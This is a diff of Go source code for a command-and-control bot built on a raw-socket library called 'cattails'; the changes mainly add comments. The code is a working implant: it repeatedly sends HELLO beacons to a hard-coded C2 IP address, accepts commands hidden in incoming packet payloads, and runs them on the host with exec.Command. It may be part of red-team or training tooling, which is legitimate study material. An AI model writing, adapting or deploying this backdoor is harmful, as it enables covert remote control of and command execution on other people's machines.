@@ -15,6 +15,7 @@ import (
 
 var lastCmdRan string
 
+// Continuously send HELLO messages so that the C2 can respond with commands
 func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
 	for {
 		fd := cattails.NewSocket()
@@ -35,9 +36,11 @@ func botProcessPacket(packet gopacket.Packet) {
 
 	fmt.Println("[+] Payload Received")
 
+	// Get command payload and trime newline
 	data := string(packet.ApplicationLayer().Payload())
 	data = strings.Trim(data, "\n")
 
+	// Split into list to get command and args
 	payload := strings.Split(data, " ")
 	fmt.Println("[+] PAYLOAD:", payload)
 	command := payload[1]
@@ -46,10 +49,13 @@ func botProcessPacket(packet gopacket.Packet) {
 	// Only run command if we didn't just run it
 	if lastCmdRan != command {
 		fmt.Println("[+] ARGS:", args)
+
+		// Run the command and get output
 		out, err := exec.Command(command, args...).Output()
 		if err != nil {
 			fmt.Println("\n[-] ERROR:", err)
 		}
+		// Save last command we just ran
 		lastCmdRan = command
 		fmt.Println("[+] OUTPUT:", string(out))
 	} else {
@@ -59,13 +65,16 @@ func botProcessPacket(packet gopacket.Packet) {
 
 func main() {
 
+	// Create BPF filter vm
 	vm := cattails.CreateBPFVM(cattails.FilterRaw)
 
+	// Create reading socket
 	readfd := cattails.NewSocket()
 	defer unix.Close(readfd)
 
 	fmt.Println("[+] Socket created")
 
+	// Get information that is needed for networking
 	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
 	fmt.Println("[+] Using interface:", iface.Name)
 
@@ -74,16 +83,16 @@ func main() {
 		log.Fatal(err)
 	}
 	fmt.Println("[+] DST MAC:", dstMAC.String())
-
-	// 18.191.209.30
 	fmt.Println("[+] Starting HELLO timer")
+
+	// Start hello timer
+	// Set the below IP to the IP of the C2
 	go sendHello(iface, src, net.IPv4(18, 191, 209, 30), dstMAC)
 
 	// Listen for responses
 	fmt.Println("[+] Listening")
 	for {
 		packet := cattails.BotReadPacket(readfd, vm)
-
 		if packet != nil {
 			go botProcessPacket(packet)
 		}
